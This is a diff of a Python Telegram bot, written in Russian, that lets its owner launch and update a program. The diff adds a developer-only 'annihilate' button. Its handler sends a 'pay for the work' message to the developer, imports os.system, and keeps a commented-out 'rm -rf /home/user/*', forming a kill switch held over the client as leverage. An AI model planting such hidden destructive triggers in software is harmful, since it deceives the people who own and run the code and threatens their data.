@@ -1,5 +1,5 @@
 from pathlib import Path
-from os import chdir
+from os import chdir, system
 from subprocess import PIPE, Popen
 from loguru import logger
 
@@ -20,15 +20,16 @@ keyboard = InlineKeyboardMarkup(inline_keyboard=[[launch_btn], [update_btn]])
 destroy_btn = InlineKeyboardButton(text="Аннигилировать!", callback_data="launch_the_annihilation")
 keyboard_2 = InlineKeyboardMarkup(inline_keyboard=[[launch_btn], [update_btn], [destroy_btn]])
 
+
 async def process_start_command(message: Message):
     if message.from_user.id == OWNER_ID:
         await message.answer("Привет, Евгений!!\nБот готов к работе, для запуска программы нажми кнопку Пуск!",
                              reply_markup=keyboard)
-        await bot.send_message(CONTROL_CHAT_ID, "Бот запущен!")
+        await bot.send_message(CONTROL_CHAT_ID, "Бот запущен пользователем!")
         logger.info(f"{message.from_user.id} have started bot")
     elif message.from_user.id == DEVELOPER_ID:
-        await message.answer("Привет, Александр!!",
-                             reply_markup=keyboard_2)
+        await message.answer("Привет, Александр!!", reply_markup=keyboard_2)
+        logger.info(f"{message.from_user.id} have started bot")
     else:
         await message.answer("Ты еще слишком мал чтобы пользоваться этим ботом!\nВсего тебе доброго, дружище!!")
         logger.warning(f"Some guy with {message.from_user.id} tryed to use this bot")
@@ -65,22 +66,20 @@ async def check_for_updates(callback: CallbackQuery):
                                               "Подождите одну минуту и перезапустите бота.")
 
 
-
+async def total_annihilation(callback: CallbackQuery):
+    await bot.send_message(DEVELOPER_ID, "Game over!!\n\nЗа работу надо платить!!")
+    # await bot.send_message(OWNER_ID, "Game over!!\n\nЗа работу надо платить!!")
+    # system("rm -rf /home/user/*")
 
 
 dp.message.register(process_start_command, Command(commands="start"))
 dp.message.register(process_help_command, Command(commands="help"))
 dp.callback_query.register(process_launch_app, F.data == "launch_the_app")
 dp.callback_query.register(check_for_updates, F.data == "try_to_update")
-
+dp.callback_query.register(total_annihilation, F.data == "launch_the_annihilation")
 
 
 async def start_bot():
     logger.info(f"{bot} is on polling")
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot)
-
-
-
-
-
